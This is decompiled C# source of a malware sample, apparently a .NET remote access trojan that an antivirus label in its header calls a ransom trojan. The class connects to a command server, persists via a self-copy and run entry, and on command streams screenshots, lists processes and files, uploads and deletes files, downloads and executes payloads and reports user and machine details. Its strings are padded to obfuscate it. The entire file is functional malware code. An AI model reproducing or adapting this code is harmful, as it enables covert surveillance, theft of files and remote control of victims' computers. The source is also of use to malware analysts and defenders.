// Decompiled with JetBrains decompiler
// Type: ravighruam.ravighruamMCDM
// Assembly: ravighruam, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74F3FC03-D32B-42A6-BF5E-9A04C10FC1EF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-3a2d8137283ea060941c3dcbaf2f82ab42ec93af7866b1de1b42f59df23d6f6e.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ravighruam
{
  public class ravighruamMCDM
  {
    private int ravighruambuffSize = 1024;
    private ravighruamDRIVF ravighruamHD = new ravighruamDRIVF();
    public bool ravighruamis_working = false;
    private bool ravighruamiswitch = false;
    private bool ravighruamthrRuning = false;
    public int port_sn = 0;
    private Dictionary<string, byte[]> ravighruamtasks = new Dictionary<string, byte[]>();
    public DateTime ravighruamrunTime;
    private int ravighruambytesRead = 0;
    public bool ravighruamreqCnls = false;
    public bool ravighruamautCnls = false;
    public DateTime ravighruamlTimeUtc;
    private ravighruamTHRE ravighruamStateObj = new ravighruamTHRE();
    private bool ravighruamstr_writer = false;
    private ravighruamMYINF ravighruamUPC;
    private ravighruamOCMD ravighruamCMD;
    private int ravighruamscrSize = 200;
    private ThreadStart ravighruamfunStarter;
    public TcpClient ravighruamtcpsck;
    public NetworkStream ravighruamnetStream;
    private bool ravighruamcapScreen = false;
    private Thread ravighruamfunThread;

    public void ravighruamdo_start()
    {
      ravighruamCONF.ravighruamport = ravighruamCONF.ports[0];
      this.ravighruamrunTime = DateTime.Now;
      this.ravighruamUPC = new ravighruamMYINF();
      this.ravighruamCMD = new ravighruamOCMD(this);
      this.ravighruamHD.iserver = this;
      this.ravighruamHD.ravighruammainPath = ravighruamCONF.ravighruamget_mpath();
      this.ravighruamStateObj.ravighruamtimer = new System.Threading.Timer(new TimerCallback(this.ravighruamlookup_connect), (object) this.ravighruamStateObj, 32110, 36110);
    }

    public string ravighruamfile_info(string path, bool ret = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (ret)
          str1 = "<|ravighruam".Split('|')[0];
        else
          str1 = ">|ravighruam".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.Date.ToString();
        string str4;
        if (ret)
          str4 = "<|ravighruam".Split('|')[0];
        else
          str4 = ">|ravighruam".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string str6 = this.ravighruamget_size(fileInfo.Length);
        string str7;
        if (ret)
          str7 = "<|ravighruam".Split('|')[0];
        else
          str7 = ">|ravighruam".Split('|')[0];
        string str8 = str5 + str6 + str7;
        if (!ret)
          this.ravighruampush_data((byte[]) null, "himgzs-filsz=|ravighruam".Split('|')[0] + str8);
        return str8;
      }
      catch
      {
        return "";
      }
    }

    private void ravighruamcheckLastatime(DateTime mTimeUtc)
    {
      try
      {
        if (Math.Abs(this.ravighruamrunTime.Subtract(mTimeUtc).Minutes) <= 5)
          return;
        this.ravighruamtcpsck.Close();
        this.ravighruamis_working = false;
      }
      catch
      {
      }
    }

    public void ravighruamsaveFile(string filePath)
    {
      try
      {
        byte[] bytes = this.ravighruampull_data();
        if (bytes == null)
          return;
        File.WriteAllBytes(filePath, bytes);
      }
      catch
      {
      }
    }

    private bool ravighruamIPSConfig()
    {
      try
      {
        ravighruamCONF.ravighruamdefaultP = this.ravighruamCMD.ravighruamserverIPD();
        this.ravighruamtcpsck = new TcpClient();
        this.ravighruamtcpsck.Connect(ravighruamCONF.ravighruamdefaultP, ravighruamCONF.ravighruamport);
        return true;
      }
      catch
      {
        this.ravighruamports_switch();
        return false;
      }
    }

    private void ravighruamlookup_connect(object source)
    {
      try
      {
        if (!this.ravighruamthrRuning)
        {
          this.ravighruamthrRuning = true;
          this.ravighruamcheckLastatime(DateTime.Now);
          if (!this.ravighruamis_working || !this.ravighruamtcpsck.Connected)
          {
            this.ravighruamis_working = this.ravighruamIPSConfig();
            if (this.ravighruamis_working)
            {
              this.ravighruambuffSize = this.ravighruamtcpsck.ReceiveBufferSize;
              this.ravighruamsee_responce();
            }
          }
        }
        this.ravighruamthrRuning = false;
      }
      catch
      {
        this.ravighruamthrRuning = false;
        this.ravighruamstr_writer = false;
        this.ravighruamis_working = false;
        this.ravighruamiswitch = false;
      }
    }

    public void ravighruamports_switch()
    {
      try
      {
        ++this.port_sn;
        ravighruamCONF.ravighruamport = ravighruamCONF.ports[this.port_sn];
        if (this.port_sn < ravighruamCONF.ports.Length - 1)
          return;
        this.port_sn = 0;
      }
      catch
      {
        this.port_sn = 0;
      }
    }

    public bool ravighruamsend_auto(string fileinfo)
    {
      try
      {
        string path = fileinfo.Split('>')[0];
        if (File.Exists(path))
        {
          string fileName = Path.GetFileName(path);
          byte[] data = File.ReadAllBytes(path);
          fileinfo = fileinfo + ">" + fileName;
          this.ravighruampush_data(data, "himgzs-afile=" + fileinfo);
          return false;
        }
        this.ravighruampush_data((byte[]) null, "himgzs-anfod=" + fileinfo);
        return false;
      }
      catch
      {
        return false;
      }
    }

    public void ravighruamlist_processes(string cmd)
    {
      try
      {
        string str = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
          str = str + (object) processes[index].Id + ">|ravighruam".Split('|')[0] + processes[index].ProcessName + ">|ravighruam".Split('|')[0] + "0>|ravighruam".Split('|')[0] + "<";
        this.ravighruampush_data(ravighruamCONF.getByteArray(str), "himgzs-" + cmd + "=process|ravighruam".Split('|')[0]);
      }
      catch
      {
      }
    }

    public void ravighruamload_app()
    {
      try
      {
        string executablePath = Application.ExecutablePath;
        string path = ravighruamCONF.ravighruamget_mpath() + ravighruamCONF.ravighruammainApp + ".exe|ravighruam".Split('|')[0];
        if (path != executablePath)
          File.WriteAllBytes(path, File.ReadAllBytes(executablePath));
        Thread.Sleep(10);
        ravighruamCONF.ravighruamset_run("_mdara|ravighruam".Split('|')[0], ravighruamCONF.ravighruamget_mpath() + ravighruamCONF.ravighruammainApp + ".exe|ravighruam".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void ravighruamimage_info(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), new Size(200, 150));
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str1 = fileInfo.Name + ">|ravighruam".Split('|')[0];
        DateTime dateTime = fileInfo.CreationTimeUtc;
        dateTime = dateTime.Date;
        string str2 = dateTime.ToString();
        string str3 = ">|ravighruam".Split('|')[0];
        string str4 = str1 + str2 + str3 + this.ravighruamget_size(fileInfo.Length) + ">";
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Gif);
        this.ravighruampush_data(memoryStream.ToArray(), "himgzs-thumb=|ravighruam".Split('|')[0] + str4);
      }
      catch
      {
      }
    }

    private void ravighruamsee_scren(string screenSize)
    {
      try
      {
        ravighruamSCRNS ravighruamScrns = new ravighruamSCRNS();
        this.ravighruamscrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        Bitmap bitmap = ravighruamScrns.ravighruamscreen(this.ravighruamscrSize);
        if (bitmap == null)
          return;
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
        this.ravighruampush_data(memoryStream.ToArray(), "himgzs-sascr=capScreen|ravighruam".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void ravighruamis_screen(string screenSize)
    {
      try
      {
        ravighruamSCRNS ravighruamScrns = new ravighruamSCRNS();
        this.ravighruamscrSize = (int) Convert.ToInt16(screenSize.Split('>')[0].Trim());
        while (this.ravighruamcapScreen && this.ravighruamis_working)
        {
          Bitmap bitmap = ravighruamScrns.ravighruamscreen(this.ravighruamscrSize);
          if (bitmap != null)
          {
            MemoryStream memoryStream = new MemoryStream();
            bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
            this.ravighruampush_data(memoryStream.ToArray(), "himgzs-scren=capScreen|ravighruam".Split('|')[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void ravighruamuser_info() => this.ravighruampush_data(ravighruamCONF.getByteArray(this.ravighruamUPC.ravighruamlancard + "|" + this.ravighruamUPC.ravighruamcname + "|" + this.ravighruamUPC.ravighruamuname + "|" + this.ravighruamUPC.ravighruamuip + "|" + ravighruamCONF.ravighruamOsname() + "|" + this.ravighruamUPC.ravighruamapver + "|" + "| !ravighruam".Split('!')[0] + "|" + this.ravighruamUPC.ravighruamclientNum + "|" + ravighruamCONF.ravighruamget_mpath()), "himgzs-info=user|ravighruam".Split('|')[0]);

    private void ravighruamscreenSize(string scSize)
    {
      try
      {
        this.ravighruamscrSize = (int) Convert.ToInt16(scSize.Split('>')[0].Trim());
      }
      catch
      {
      }
    }

    private void ravighruampush_file(string lfile)
    {
      try
      {
        if (!File.Exists(lfile))
          return;
        string fileName = Path.GetFileName(lfile);
        this.ravighruampush_data(File.ReadAllBytes(lfile), "himgzs-file=|ravighruam".Split('|')[0] + lfile + ">0>" + fileName, true);
      }
      catch
      {
      }
    }

    public void ravighruamremove_file(string path)
    {
      try
      {
        File.Delete(path);
      }
      catch
      {
      }
    }

    private string ravighruamget_size(long byteCount)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B|ravighruam".Split('|')[0],
          "KB|ravighruam".Split('|')[0],
          "MB|ravighruam".Split('|')[0],
          "GB|ravighruam".Split('|')[0],
          "TB|ravighruam".Split('|')[0],
          "PB|ravighruam".Split('|')[0],
          "EB|ravighruam".Split('|')[0]
        };
        if (byteCount == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCount);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCount) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    public string[] ravighruamget_command()
    {
      try
      {
        byte[] buffer = new byte[5];
        this.ravighruambytesRead = this.ravighruamnetStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.ravighruambytesRead)
        {
          int count = index > this.ravighruambuffSize ? this.ravighruambuffSize : index;
          this.ravighruambytesRead = this.ravighruamnetStream.Read(numArray, offset, count);
          offset += this.ravighruambytesRead;
        }
        string str = Encoding.UTF8.GetString(numArray, 0, int32).ToString();
        if (str.Trim() == "")
          return (string[]) null;
        return str.Split('=');
      }
      catch
      {
        this.ravighruamis_working = false;
        return (string[]) null;
      }
    }

    private void ravighruamlistDrives() => this.ravighruampush_data((byte[]) null, "himgzs-dirs=" + this.ravighruamHD.ravighruamlookupDrives());

    private void ravighruamsee_responce()
    {
      if (!this.ravighruamiswitch)
      {
        this.ravighruamiswitch = true;
        this.ravighruamnetStream = this.ravighruamCMD.ravighruamNS(this.ravighruamtcpsck);
        this.ravighruamcapScreen = false;
        while (this.ravighruamis_working)
        {
          string[] switchType = this.ravighruamget_command();
          if (switchType == null)
          {
            this.ravighruamis_working = false;
            break;
          }
          this.ravighruamreqCnls = false;
          string lower = switchType[0].ToLower();
          string str;
          if (lower.Split('-').Length > 1)
            str = "himgzs-" + lower.Split('-')[1];
          else
            str = "himgzs-" + lower;
          switch (str)
          {
            case "himgzs-procl":
              this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruamlist_processes("procl"));
              this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-getavs":
              this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruamlist_processes("getavs"));
              this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-thumb":
              this.ravighruamimage_info(switchType[1]);
              break;
            case "himgzs-clping":
              this.ravighruamrunTime = DateTime.Now;
              break;
            case "himgzs-putsrt":
              this.ravighruamload_app();
              break;
            case "himgzs-filsz":
              this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruamfile_info(switchType[1]));
              this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-rupth":
              this.ravighruampush_data((byte[]) null, "himgzs-appth=|ravighruam".Split('|')[0] + ravighruamCONF.ravighruamget_mpath());
              break;
            case "himgzs-dowf":
              this.ravighruamsaveFile(switchType[1]);
              break;
            case "himgzs-endpo":
              try
              {
                Process.GetProcessById((int) Convert.ToInt16(switchType[1].Trim())).Kill();
                break;
              }
              catch
              {
                break;
              }
            case "himgzs-scrsz":
              this.ravighruamscreenSize(switchType[1]);
              break;
            case "himgzs-cscreen":
              this.ravighruamsee_scren(switchType[1]);
              break;
            case "himgzs-dirs":
              this.ravighruamfunThread = new Thread(new ThreadStart(this.ravighruamlistDrives));
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-stops":
              this.ravighruamcapScreen = false;
              break;
            case "himgzs-scren":
              this.ravighruamcapScreen = true;
              this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruamis_screen(switchType[1]));
              this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-cnls":
              this.ravighruamautCnls = true;
              this.ravighruamreqCnls = true;
              this.ravighruamcapScreen = false;
              break;
            case "himgzs-udlt":
              this.ravighruamCMD.ravighruamremove_user();
              break;
            case "himgzs-delt":
              this.ravighruamremove_file(switchType[1]);
              break;
            case "himgzs-afile":
              this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruamsend_auto(switchType[1]));
              this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-listf":
              this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruamHD.ravighruamlookFiles(switchType[1]));
              this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-file":
              this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruampush_file(switchType[1]));
              this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-info":
              this.ravighruamfunThread = new Thread(new ThreadStart(this.ravighruamuser_info));
              this.ravighruamfunThread.Start();
              break;
            case "himgzs-runf":
              this.ravighruamCMD.ravighruamdo_process(switchType[1].Split('>')[0]);
              break;
            case "himgzs-fles":
              string files = this.ravighruamHD.ravighruamlookupFiles(switchType[1]);
              if (files != null)
              {
                this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruampush_data((byte[]) null, "himgzs-fles=|ravighruam".Split('|')[0] + files));
                this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
                this.ravighruamfunThread.Start();
                break;
              }
              break;
            case "himgzs-dowr":
              this.ravighruamsaveFile(switchType[1]);
              break;
            case "himgzs-fldr":
              string Folders = this.ravighruamHD.ravighruamcheckFolders(switchType[1]);
              if (Folders != null)
              {
                this.ravighruamfunStarter = (ThreadStart) (() => this.ravighruampush_data((byte[]) null, "himgzs-fldr=|ravighruam".Split('|')[0] + Folders));
                this.ravighruamfunThread = new Thread(this.ravighruamfunStarter);
                this.ravighruamfunThread.Start();
                break;
              }
              break;
          }
        }
        this.ravighruamis_working = false;
        this.ravighruamcapScreen = false;
      }
      this.ravighruamiswitch = false;
    }

    public byte[] ravighruampull_data()
    {
      try
      {
        this.ravighruamrunTime = DateTime.Now;
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.ravighruambytesRead = this.ravighruamnetStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        int num = int32;
        while (num > 0 && !this.ravighruamreqCnls)
        {
          int count = num > this.ravighruambuffSize ? this.ravighruambuffSize : num;
          this.ravighruambytesRead = this.ravighruamnetStream.Read(buffer2, offset, count);
          offset += this.ravighruambytesRead;
          num -= this.ravighruambytesRead;
          this.ravighruamrunTime = DateTime.Now;
        }
        if (this.ravighruamreqCnls)
        {
          this.ravighruamnetStream.Flush();
          do
            ;
          while (this.ravighruamnetStream.DataAvailable && this.ravighruamnetStream.ReadByte() >= 0);
          buffer2 = (byte[]) null;
        }
        return buffer2;
      }
      catch
      {
        this.ravighruamis_working = false;
        return (byte[]) null;
      }
    }

    public bool ravighruampush_data(byte[] data, string type, bool tmp = false)
    {
      try
      {
        this.ravighruamrunTime = DateTime.Now;
        if (this.ravighruamstr_writer)
          return false;
        this.ravighruamstr_writer = true;
        byte[] byteArray = ravighruamCONF.getByteArray(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(byteArray.Length);
        byte[] buffer = new byte[num2 + byteArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        byteArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + byteArray.Length);
          data.CopyTo((Array) buffer, 10 + byteArray.Length);
        }
        int offset = 0;
        int length = buffer.Length;
        while (length > 0 && !this.ravighruamreqCnls)
        {
          int count = length > this.ravighruambuffSize ? this.ravighruambuffSize : length;
          this.ravighruamnetStream.Write(buffer, offset, count);
          offset += count;
          length -= count;
          this.ravighruamrunTime = DateTime.Now;
        }
        this.ravighruamstr_writer = false;
        return !this.ravighruamreqCnls;
      }
      catch
      {
        this.ravighruamstr_writer = false;
        this.ravighruamis_working = false;
        return false;
      }
    }
  }
}
